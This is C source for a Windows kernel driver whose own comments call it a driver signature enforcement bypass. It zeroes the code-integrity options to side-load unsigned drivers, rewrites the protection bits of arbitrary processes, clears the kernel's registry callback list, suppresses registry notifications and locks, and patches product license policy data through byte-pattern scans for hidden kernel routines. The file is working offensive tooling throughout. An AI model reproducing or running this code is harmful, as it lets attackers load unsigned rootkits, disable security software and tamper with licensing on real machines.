#include <ntifs.h>
#include <ntimage.h>
#define _WIND_DRIVER
#include "defs.h"
#include "wind.h"
#include "regint.h"

static wind_config_t cfg = {(void*)(-(LONG)sizeof(cfg))};
static KMUTEX ioctl_mutex;


//
// What follows is the meat of the whole DSE bypass.
//
// We temporarily flip the ci_Options to not validate, load driver, flip
// ci_options back.
//
static void ci_restore()
{
	DBG("current ci_Options=%08x\n", *((ULONG*)cfg.ci_opt));
	cfg.ci_opt[0] = cfg.ci_guess;
	DBG("now restored ci_Options=%08x\n", *((ULONG*)cfg.ci_opt));
}

static NTSTATUS driver_sideload(PUNICODE_STRING svc)
{
	NTSTATUS status;

	// Clear ci_Options. Daaaaanger zone.
	cfg.ci_opt[0] = 0;

	// Now go fetch.
	status = ZwLoadDriver(svc);

	// Restore ci_Options.
	ci_restore();

	return status;
}

// The rest is just boring driver boilerplate...
static NTSTATUS NTAPI dev_open(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

// Restore/remove notify of one potential CM_KEY_BODY.
static int notify_unlock(int lock, CM_KEY_BODY *tkb, CM_KEY_BODY *kb)
{
	int ret = 0;
	CM_NOTIFY_BLOCK *nb;
	DBG("unlock %d %p %p\n",lock,tkb,kb);

	if (!tkb)
		return 0;
	if (tkb->KeyControlBlock != kb->KeyControlBlock)
		return 0;
	nb = tkb->NotifyBlock;
	while (nb) {
		union {
			struct {
			ULONG low:8;
			ULONG high:8;
			ULONG rest:14;
			};
			ULONG n:30;
		} f;
		if (nb->KeyControlBlock != kb->KeyControlBlock)
			goto skipentry;

		f.n = nb->Filter;
		DBG("process NB @ %p Filter=%x high=%x low=%x\n",
				nb, nb->Filter, f.high, f.low);
		if (!lock && f.low && !f.high) {
			f.high = f.low;
			f.low = 0;
			DBG("unlock: changing filter from %x to %x", nb->Filter, f.n);
			nb->Filter = f.n;
			ret++;
		}
		if (lock && f.high && !f.low) {
			f.low = f.high;
			f.high = 0;
			DBG("re-lock: changing filter from %x to %x", nb->Filter, f.n);
			nb->Filter = f.n;
			ret++;
		}
skipentry:
		if (!nb->HiveList.Flink)
			break;
		nb = CONTAINING_RECORD(nb->HiveList.Flink,
				CM_NOTIFY_BLOCK, HiveList);
	}
	return ret;
}

static NTSTATUS open_key(HANDLE *h, PUNICODE_STRING name)
{
	OBJECT_ATTRIBUTES attr = {
		.Length = sizeof(attr),
		.Attributes = OBJ_KERNEL_HANDLE|OBJ_CASE_INSENSITIVE,
		.ObjectName = name
	};
	return ZwOpenKey(h, KEY_READ, &attr);
}

// Stop/reenable notifications on registry key.
static NTSTATUS reg_set_notify(PUNICODE_STRING name, int lock)
{
#define KLOCK_FLAGS (CM_KCB_NO_DELAY_CLOSE|CM_KCB_READ_ONLY_KEY)
#define KUNLOCK_MARKER (1<<15)
#define NSPAM 6
	HANDLE 		harr[NSPAM];
	CM_KEY_BODY 	*kbs[NSPAM], *kb;
	NTSTATUS 	st;
	CM_KEY_CONTROL_BLOCK *cb;
	LIST_ENTRY 	*kl;
	void 		**scan;
	int 		i;
	struct {
		LIST_ENTRY 	KeyBodyListHead;
		CM_KEY_BODY  	*KeyBodyArray[4];
	} *cbptr = NULL;

	// Spam handles to ensure we'll appear in cbptr->KeyBodyListHead.
	for (i = 0; i < NSPAM; i++) {
		st = open_key(&harr[i], name);
		if (!NT_SUCCESS(st))
			goto out_unspam_zwclose;
	}
	for (i = 0; i < NSPAM; i++) {
		st = ObReferenceObjectByHandle(harr[i], KEY_WRITE,
				*CmKeyObjectType, 0, (void*)&kbs[i], NULL);
		if (!NT_SUCCESS(st))
			goto out_unspam_deref;
	}

	kb = kbs[NSPAM-1];
	cb = kb->KeyControlBlock;
	st = STATUS_KEY_DELETED;
	if (!cb || cb->Delete)
		goto out_unspam;

	scan = (void*)cb;
	st = STATUS_INTERNAL_ERROR;
	DBG("kb=%p cb=%p, scanning...\n", kb, cb);
	// Find ourselves in the CM_KEY_CONTROL_BLOCK structure.
	for (i = 0; i < 512; i++) {
		DBG("scan near %p = %p %p\n", &scan[i], scan[i], &kb->KeyBodyList)
		if (scan[i] == &kb->KeyBodyList) {
			cbptr = (void*)(scan+i-1);
			break;
		}
	}
	if (!cbptr) {
		DBG("cbptr not found\n");
		goto out_unspam;
	}

	DBG("cbptr @ %p, offset %p\n", cbptr, ((ULONG_PTR)(((void*)cbptr)-((void*)cb))));

	// Now process array area.
	for (i = 0; i < 4; i++)
		if (notify_unlock(lock, cbptr->KeyBodyArray[i], kb))
			st = STATUS_SUCCESS;

	// And list area too.
	kl = cbptr->KeyBodyListHead.Flink;
	DBG("kl=%p\n");
	while (kl && (kl != &cbptr->KeyBodyListHead)) {
		CM_KEY_BODY *tkb = CONTAINING_RECORD(kl, CM_KEY_BODY, KeyBodyList);
		if (notify_unlock(lock, tkb, kb))
			st = STATUS_SUCCESS;
		kl = kl->Flink;
	}

out_unspam:;
	i = NSPAM;
out_unspam_deref:
	for (int j = 0; j < i; j++)
		ObDereferenceObject(kbs[j]);
	i = NSPAM;
out_unspam_zwclose:
	for (int j = 0; j < i; j++)
		ZwClose(harr[j]);
	return st;
}

// Apply/remove hard lock.
static NTSTATUS reg_set_lock(PUNICODE_STRING name, int lock)
{
	HANDLE h;
	NTSTATUS st;
	CM_KEY_CONTROL_BLOCK *cb;
	CM_KEY_BODY *kb;

	st = open_key(&h, name);
	if (!NT_SUCCESS(st))
		return st;
	st = ObReferenceObjectByHandle(h, KEY_WRITE,
			*CmKeyObjectType, 0, (void*)&kb, NULL);

	if (!NT_SUCCESS(st)) {
		ZwClose(h);
		return st;
	}
	cb = kb->KeyControlBlock;
	st = STATUS_KEY_DELETED;
	if (!cb || cb->Delete)
		goto out;

	DBG("lock=%d, kb=%p, cb=%p, t=%x refc=%u flags=%02x nb=%p\n",
	lock, kb, cb, kb->Type, cb->RefCount, cb->ExtFlags, kb->NotifyBlock);

	st = STATUS_SUCCESS;
	if (lock) {
		cb->ExtFlags |= KLOCK_FLAGS;
	} else {
		cb->ExtFlags &= ~KLOCK_FLAGS;
	}
out:;
	ObDereferenceObject(kb);
	ZwClose(h);
	return st;
}

static NTSTATUS regs_do(NTSTATUS (*fn)(PUNICODE_STRING,int), PUNICODE_STRING names,
		int lock)
{
	WCHAR *p = names->Buffer;
	NTSTATUS status = STATUS_SUCCESS;

	if (!p)
		return status;

	while (*p) {
		WCHAR *next;
		UNICODE_STRING split;
		NTSTATUS item_status;
	
		next = wcschr(p, L';');
		if (next)
			*next = 0;

		RtlInitUnicodeString(&split, p);
		item_status = fn(&split, lock);
		if (NT_SUCCESS(status) && !NT_SUCCESS(item_status))
			status = item_status;
		if (!next)
			break;
		p = next+1;
	}
	return status;
}

static NTSTATUS change_prot(wind_prot_t *req)
{
	int getonly;
	void *proc;
	NTSTATUS status;
	if ((getonly = (req->pid < 0)))
		req->pid = -req->pid;
	status = PsLookupProcessByProcessId((HANDLE)(req->pid), (PEPROCESS*)&proc);
	if (!NT_SUCCESS(status))
		return status;
	if (cfg.protbit < 0) {
		WIND_PS_PROTECTION save, *prot = proc + cfg.protofs - 2;
		memcpy(&save, prot, sizeof(save));
		if (!getonly)
			memcpy(prot, &req->prot, sizeof(req->prot));
		memcpy(&req->prot, &save, sizeof(save));
	} else {
		ULONG prev, *prot = proc + cfg.protofs;
		prev = *prot;
		if (!getonly)
			*prot = (prev & (~(1<<cfg.protbit)))
				| ((!!req->prot.Level) << cfg.protbit);
		memset(&req->prot, 0, sizeof(req->prot));
		req->prot.Level = (prev>>cfg.protbit)&1;
	}
	ObDereferenceObject(proc);
	return status;
}

static NTSTATUS regcb_set(int enable)
{
	static LIST_ENTRY saved_list;
	static int cleared = 0;
	if (!cfg.cblist)
		return STATUS_NOT_SUPPORTED;
	if (cleared ^ enable)
		return STATUS_DEVICE_BUSY;
	if (!enable) {
		saved_list = *cfg.cblist;
		InitializeListHead(cfg.cblist);
		cleared = 1;
	} else {
		*cfg.cblist = saved_list;
		cleared = 0;
	}
	return STATUS_SUCCESS;
}

// Helper scratch space for parser.
typedef struct {
	wind_pol_ent *ents[WIND_POL_MAX];
	UCHAR scratch[65536], *p;
	int nent;
} parse_t;

// Walk through our custom policies, and patch em up into the system one.
static NTSTATUS NTAPI parse_policy(WCHAR *name, ULONG typ, void *data, ULONG len,
		void *pparse, void *unused)
{
	parse_t *parse = pparse;
	wind_pol_ent *e;
	int i, nlen;
	if (!name)
		return STATUS_SUCCESS;
	nlen = wcslen(name)*2;
	DBG("Inside parser, %S, typ=%d, nent=%d %p %p %p\n",name,typ,parse->nent,parse,unused,data);
	// Sane type.
	if ((typ != REG_SZ) && (typ != REG_BINARY) && (typ != REG_DWORD))
		return STATUS_SUCCESS;
	// Find entry of given name
	for (i = 0; i < parse->nent; i++) {
		if (parse->ents[i]->name_sz == nlen
			&& (RtlCompareMemory(parse->ents[i]->name, name, nlen)==nlen)) {
			DBG("found at index %d\n",i);
			break;
		}
	}
	// Allocate scratch space
	e = (void*)parse->p;
	parse->p += sizeof(*e) + len + nlen;
	if (parse->p > (parse->scratch + sizeof(parse->scratch)))
		return STATUS_SUCCESS;
	// If name not found, allocate new entry.
	if (i == parse->nent) {
		e->flags = 0;
		if (parse->nent == WIND_POL_MAX)
			return STATUS_SUCCESS;
		parse->nent++;
	} else {
		// Otherwise we'll overwrite previous entry, preserve flags.
		e->flags = parse->ents[i]->flags;
	}
	// Fill in entry. Note that padding (as well as final size)
	// is done via wind_pol_pack().
	e->name_sz = nlen;
	e->type = typ;
	e->data_sz = len;
	e->pad0 = 0;
	memcpy(e->name, name, nlen);
	memcpy(e->name + nlen, data, len);
	parse->ents[i] = e;
	return STATUS_SUCCESS;
}

// System policy has changed, apply our custom rules.
static NTAPI void pol_arm_notify(HANDLE key)
{
	static WORK_QUEUE_ITEM it;
	static IO_STATUS_BLOCK io;
	static struct {
		KEY_VALUE_PARTIAL_INFORMATION v;
		UCHAR buf[65536];
	} vb;
	static parse_t parse;
	static UCHAR buf[65536];
	ULONG got = sizeof(vb);

	// Grab current view of policy and parse its entries.
	parse.nent = -1;
	if (NT_SUCCESS(ZwQueryValueKey(key, &RTL_STRING(L""PRODUCT_POLICY),
			KeyValuePartialInformation, &vb, sizeof(vb), &got)))
		parse.nent = wind_pol_unpack(vb.v.Data, parse.ents);
	if (parse.nent >= 0) {
		RTL_QUERY_REGISTRY_TABLE qt[2] = { {
			.QueryRoutine = parse_policy,
			.Name = L""CUSTOM_POLICY,
			.Flags = RTL_QUERY_REGISTRY_SUBKEY|RTL_QUERY_REGISTRY_NOEXPAND,
		},{} };
		// Now filter it through our own "policy".
		parse.p = parse.scratch;
		if (NT_SUCCESS(RtlQueryRegistryValues(0, POLICY_PATH, qt, &parse, NULL))) {
			// If ok, pack it again
			int len = wind_pol_pack(buf, parse.ents, parse.nent);
			// And update cache.
			if (cfg.pExUpdateLicenseData)
				cfg.pExUpdateLicenseData(len, buf);
			else if (cfg.pExUpdateLicenseData2)
				cfg.pExUpdateLicenseData2(len, buf);
			ZwSetValueKey(key, &RTL_STRING(L""PRODUCT_POLICY), 0, REG_BINARY, buf, len);
		}
	}
	DBG("Re-arming notification\n");
	memset(&it, 0, sizeof(it));
	it.WorkerRoutine = pol_arm_notify;
	it.Parameter = key;
	ZwNotifyChangeKey(key, NULL, (void*)&it, (void*)1,
				&io, 5, TRUE, NULL, 0, TRUE);
}

static NTSTATUS NTAPI dev_control(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	PIO_STACK_LOCATION io_stack;
	ULONG code;
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	UNICODE_STRING us;
	void *buf;
	int len,onoff;

	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);

	io_stack = IoGetCurrentIrpStackLocation(irp);
	if (!io_stack)
		goto out;

	buf = irp->AssociatedIrp.SystemBuffer;
	len = io_stack->Parameters.DeviceIoControl.InputBufferLength;
	code = io_stack->Parameters.DeviceIoControl.IoControlCode;

	irp->IoStatus.Information = 0;

	if (!SeSinglePrivilegeCheck(LUID_SeLoadDriverPrivilege, irp->RequestorMode)) {
		status = STATUS_PRIVILEGE_NOT_HELD;
		goto out;
	}

	status = STATUS_INVALID_BUFFER_SIZE;
	DBG("code=%08x\n",(unsigned)code);

	// codes 0x90x and 0x81x need buffer.
	if ((code & ((0x110)<<2)) && (!buf))
		goto out;

	// 0x10 marks string argument.
	if (code & (0x10 << 2)) {
		// must be at least 2 long, must be even, must terminate with 0
		if ((len < 2) || (len&1) || (*((WCHAR*)(buf+len-2))!=0))
			goto out;

		us.Buffer = (void*)buf;
		us.Length = len-2;
		us.MaximumLength = len;
	}

	onoff = (code>>2)&1;
switch (code) {
	case WIND_IOCTL_INSMOD:
		status = driver_sideload(&us);
		break;
	case WIND_IOCTL_REGLOCKON:
	case WIND_IOCTL_REGLOCKOFF:
		status = regs_do(reg_set_lock, &us, onoff);
		break;
	case WIND_IOCTL_REGNON:
	case WIND_IOCTL_REGNOFF:
		status = regs_do(reg_set_notify, &us, onoff);
		break;
	case WIND_IOCTL_PROT:
		if (len != sizeof(wind_prot_t))
			goto out;
		status = change_prot(buf);
		irp->IoStatus.Information = len;
		break;
	case WIND_IOCTL_REGCBON:
	case WIND_IOCTL_REGCBOFF:
		status = regcb_set(onoff);
		break;
}
out:;
	KeReleaseMutex(&ioctl_mutex, 0);
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

static VOID NTAPI dev_unload(IN PDRIVER_OBJECT self)
{
	DBG("unloading!\n");
	// Restore callbacks.
	regcb_set(1);
	// Nuke our own notify, so that kernel does not call junk.
	reg_set_notify(&RTL_STRING(POLICY_PATH), 0);
	IoDeleteDevice(self->DeviceObject);
}

static int k_brute()
{
	UCHAR *p = MmGetSystemRoutineAddress(&RTL_STRING(L"MmMapViewInSessionSpace"));
	DBG("marker at %p\n", p);
	if (!p) return 0;
	for (int i = 0; i < 256*1024; i++, p--) {
#ifdef _WIN64
		if (EQUALS(p + 14,"\x48\x81\xec\xa0\x04\x00\x00") && p[0] == 0x48)
#else
		if (EQUALS(p,"\x68\x28\x04\x00\x00\x68"))
#endif
		{
			DBG("ExUpdateLicenseData guessed at %p\n", p);
			cfg.pExUpdateLicenseData2 = (void*)p;
			return 1;
		}
	}
	DBG("Even the brute guess failed.\n");
	return 0;
}

static int k_analyze()
{
	int i;
	UCHAR *p = (void*)MmGetSystemRoutineAddress(&RTL_STRING(L"PsGetProcessProtection"));
	cfg.protbit = -1;
	cfg.protofs = 0;
	if (!p) {
		cfg.protbit = 11;
		p = (void*)MmGetSystemRoutineAddress(&RTL_STRING(L"PsIsProtectedProcess"));
		// mov 
		for (i = 0; i < 64; i++, p++)
			// mov eax, [anything + OFFSET]; shr eax, 11
			if (RtlCompareMemory(p+2, "\x00\x00\xc1\xe8\x0b",5)==5)
				goto protfound;
	} else {
		// mov al, [anything+OFFSET]
		for (i =0 ; i < 64; i++, p++)
			if ((p[-2] == 0x8a) && (!p[2] && !p[3]))
				goto protfound;
	}
	DBG("failed to find protbit\n");
	return 0;
protfound:;
	cfg.protofs = *((ULONG*)p);
	DBG("prot done");

	p = (void*)MmGetSystemRoutineAddress(&RTL_STRING(L"CmUnRegisterCallback"));
	if (!p) goto nocb;
	for (i = 0; i < 512; i++, p++) { 
#ifdef _WIN64
		// lea rcx, cblist; call ..; mov rdi, rax
		if (p[-3] == 0x48 && p[-2] == 0x8d && p[-1] == 0x0d &&
			p[4] == 0xe8 && p[9] == 0x48 && p[10] == 0x8b && p[11] == 0xf8) {
			cfg.cblist = (void*)((p + 4) + *((LONG*)p));
			break;
		}

#else
		// mov edi, offset cblist; mov eax, edi; call
		if ((p[-1] == 0xbf && p[4] == 0x8b && p[5] == 0xc7 && p[6] == 0xe8) ||
		    (p[-1] == 0xbe && p[4] == 0x53 && p[5] == 0x8d && p[6] == 0x55)) {
			cfg.cblist = *((void**)p);
			break;
		}
#endif
	}
nocb:;
	DBG("CallbackListHead @ %p", cfg.cblist);
	cfg.pExUpdateLicenseData = MmGetSystemRoutineAddress(&RTL_STRING(L"ExUpdateLicenseData"));
	if (cfg.pExUpdateLicenseData)
		return 1;

	return k_brute();
}


NTSTATUS NTAPI ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING reg)
{
	PDEVICE_OBJECT dev;
	NTSTATUS status;
	UNICODE_STRING regs[4]={{0}};
	RTL_QUERY_REGISTRY_TABLE tab[] = {{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK
			|RTL_QUERY_REGISTRY_REQUIRED
#ifdef NDEBUG
			|RTL_QUERY_REGISTRY_DELETE
#endif
			,
		.Name = L"cfg",
		.EntryContext = &cfg,
		.DefaultType = (REG_BINARY<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT)
			|REG_NONE
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"RD",
		.EntryContext = regs,
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"RE",
		.EntryContext = regs+1,
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"ND",
		.EntryContext = regs+2,
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"NE",
		.EntryContext = regs+3,
	},
	{}};

	status = RtlQueryRegistryValues(0, reg->Buffer, tab, NULL, NULL);
	if (!NT_SUCCESS(status)) {
		DBG("registry read failed=%x\n",(unsigned)status);
		return status;
	}
	self->DriverUnload = dev_unload;
	self->MajorFunction[IRP_MJ_CREATE] = dev_open;
	self->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dev_control;

	status = IoCreateDevice(self, 0, &RTL_STRING(L"\\Device\\" WIND_DEVNAME),
			FILE_DEVICE_UNKNOWN, 0, 0, &dev);

	if (!NT_SUCCESS(status)) {
		DBG("failed to create device=%08x\n",(unsigned)status);
		return status;
	}

	if (cfg.ci_orig)
		cfg.ci_guess = *cfg.ci_orig;
	ci_restore();

	KeInitializeMutex(&ioctl_mutex, 0);
	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);

	dev->Flags |= METHOD_BUFFERED;
	dev->Flags &= ~DO_DEVICE_INITIALIZING;

	if (cfg.bootreg) {
		regs_do(reg_set_lock, regs, 0);
		regs_do(reg_set_lock, regs+1, 1);
		regs_do(reg_set_notify, regs+2, 0);
		regs_do(reg_set_notify, regs+3, 1);
	}

	if (k_analyze()) {
		HANDLE kh;
		reg_set_notify(&RTL_STRING(POLICY_PATH), 0);
		if (NT_SUCCESS(open_key(&kh, &RTL_STRING(POLICY_PATH))))
			pol_arm_notify(kh);
	}

	DBG("initialized driver with:\n"
		" .ci_opt = %p\n"
		" .ci_orig = %p\n"
		" .ci_guess = %02x\n"
		" .protofs = %x\n"
		" .protbit = %d\n", cfg.ci_opt, cfg.ci_orig, cfg.ci_guess,
		cfg.protofs, cfg.protbit);

	KeReleaseMutex(&ioctl_mutex, 0);
	DBG("loaded driver\n");
	return status;
}

